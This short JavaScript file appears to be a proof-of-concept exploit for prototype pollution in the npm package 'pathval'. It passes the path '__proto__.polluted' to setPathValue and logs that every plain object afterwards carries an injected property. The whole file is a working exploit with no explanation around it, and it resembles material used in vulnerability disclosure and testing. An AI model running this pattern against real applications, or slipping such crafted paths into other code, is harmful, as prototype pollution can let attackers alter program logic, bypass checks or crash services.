var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var pathval = require('pathval');
var obj = {};
console.log({}.polluted);
pathval.setPathValue(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);